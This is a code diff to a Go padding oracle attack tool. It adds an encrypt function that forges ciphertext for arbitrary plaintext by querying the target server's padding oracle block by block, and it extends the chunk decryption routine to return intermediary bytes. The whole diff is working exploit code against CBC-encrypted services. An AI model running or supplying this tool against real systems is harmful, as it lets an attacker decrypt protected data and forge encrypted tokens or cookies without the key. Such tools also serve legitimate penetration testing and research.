@@ -6,9 +6,11 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"math"
+	"strings"
 )
 
-func decipher(cipherEncoded string) ([]byte, error) {
+func decrypt(cipherEncoded string) ([]byte, error) {
 
 	blockLen := *config.blockLen //just a shortcut
 
@@ -57,10 +59,10 @@ func decipher(cipherEncoded string) ([]byte, error) {
 	currentStatus.openBar(plainLen)
 	defer currentStatus.closeBar()
 
-	// decode every cipher chunk and fill-in the relevant plaintext positions
+	// decrypt every cipher chunk and fill-in the relevant plaintext positions
 	// we move backwards through chunks, though it really doesn't matter
 	for i := len(cipherChunks) - 1; i >= 0; i-- {
-		plainChunk, err := decipherChunk(cipherChunks[i])
+		plainChunk, _, err := decryptChunk(cipherChunks[i])
 		if err != nil {
 			// report error to current status
 			return nil, err
@@ -70,6 +72,38 @@ func decipher(cipherEncoded string) ([]byte, error) {
 
 	// that's it!
 	return plainText, nil
+}
+
+func encrypt(plainText string) ([]byte, error) {
+	blockLen := *config.blockLen
+
+	/* The number of blocks is the length of the plaintext+1 divided by the size of a block, rounded up.
+	We add 1 to the plaintext to make sure we actually get 1 more block of padding if len(plainText) % blockLen == 0 */
+	blockCount := int(math.Ceil(float64(len(plainText)+1.0) / float64(blockLen)))
+	padding := (blockCount * (blockLen)) - len(plainText)
+	paddedPlainText := plainText + strings.Repeat(string(padding), padding)
+
+	// Initialize a slice that will contain our cipherText (blockCount + 1 for IV)
+	cipher := make([]byte, blockLen*(blockCount+1))
+
+	/* Start with the last block and move towards the 1st block.
+	Each block is used successively as a IV and then as a cipherText in the next iteration */
+	for blockNum := blockCount - 1; blockNum >= 0; blockNum-- {
+
+		forgedBytes := cipher[(blockNum)*blockLen : (blockNum+2)*blockLen]
+
+		// Use decryptChunk to find the intermediary bytes, we don't care about the plainText
+		_, intermediaryBytes, err := decryptChunk(forgedBytes)
+		if err != nil {
+			return nil, fmt.Errorf("error occurred while decrypting the block: %w", err)
+		}
+
+		// XOR the intermediary byte with the corresponding plaintext byte to get the forged cipherText
+		for i, val := range intermediaryBytes {
+			cipher[blockNum*blockLen+i] = paddedPlainText[blockNum*blockLen+i] ^ val
+		}
+	}
+	return cipher, nil
 }
 
 /* carry out pre-flight checks:
@@ -119,12 +153,13 @@ func confirmOracle(cipher []byte) error {
 	return nil
 }
 
-/* deciphers the chunk of cipher, the passed chunk should be of length blockLen*2 */
-func decipherChunk(chunk []byte) ([]byte, error) {
+/* decrypts the chunk of cipher, the passed chunk should be of length blockLen*2 */
+func decryptChunk(chunk []byte) ([]byte, []byte, error) {
 	blockLen := *config.blockLen
 
-	// create buffer to store the deciphered block of plaintext
+	// create buffer to store the decrypted block of plaintext
 	plainText := make([]byte, blockLen)
+	intermediaryBytes := make([]byte, blockLen)
 
 	// we start with the last byte of first block
 	// and repeat the same procedure for every byte in that block, moving backwards
@@ -141,7 +176,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 			*/
 			found, err := findGoodBytes(chunk, pos, 2)
 			if err != nil {
-				return nil, err
+				return nil, nil, err
 			}
 
 			/* for reasons described above, we must ensure that valid padding is indeed \x01
@@ -154,7 +189,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 
 				e, err := isPaddingError(chunk, nil) // and check for padding error
 				if err != nil {
-					return nil, err
+					return nil, nil, err
 				}
 				// if padding error did not happen, it's a good byte we found!
 				if !e {
@@ -167,7 +202,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 			well, something is wrong
 			i mean we just got those bytes without padding errors */
 			if foundByte == nil {
-				return nil, errors.New("Unexpected server behavior. Aborting")
+				return nil, nil, errors.New("Unexpected server behavior. Aborting")
 			}
 
 			// restore second-to-last byte, remember?
@@ -176,7 +211,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 			/* the logic for other positions is way simpler */
 			found, err := findGoodBytes(chunk, pos, 1)
 			if err != nil {
-				return nil, err
+				return nil, nil, err
 			}
 			foundByte = &found[0]
 		}
@@ -186,10 +221,12 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 		plainText[pos] = *foundByte ^ originalByte ^ currPaddingValue
 
 		// report to current status about deciphered plain byte
-		currentStatus.reportPlainByte(plainText[pos])
-
+		if !*config.encrypt {
+			currentStatus.reportPlainByte(plainText[pos])
+		}
 		/* we need to repair the padding for the next shot
 		e.g. we need to adjust the already tampered bytes block*/
+		intermediaryBytes[pos] = *foundByte ^ currPaddingValue
 		chunk[pos] = *foundByte
 		nextPaddingValue := currPaddingValue + 1
 		adjustingValue := currPaddingValue ^ nextPaddingValue
@@ -198,7 +235,7 @@ func decipherChunk(chunk []byte) ([]byte, error) {
 		}
 	}
 
-	return plainText, nil
+	return plainText, intermediaryBytes, nil
 }
 
 /* finds bytes that fit-in without causing the padding oracle
@@ -211,7 +248,7 @@ func findGoodBytes(chunk []byte, pos int, maxCount int) ([]byte, error) {
 	/* output container */
 	out := make([]byte, 0, maxCount)
 
-	/* communcation channels */
+	/* communication channels */
 	chanVal := make(chan byte, 256)
 	chanPara := make(chan byte, *config.parallel)
 	chanPaddingError := make(chan byte, 256)
@@ -226,7 +263,7 @@ func findGoodBytes(chunk []byte, pos int, maxCount int) ([]byte, error) {
 			chanPara <- 1
 			defer func() { <-chanPara }()
 
-			// copy chunk to make tamepering concurrent-safe
+			// copy chunk to make tampering concurrent-safe
 			chunkCopy := make([]byte, len(chunk))
 			copy(chunkCopy, chunk)
 			chunkCopy[pos] = value
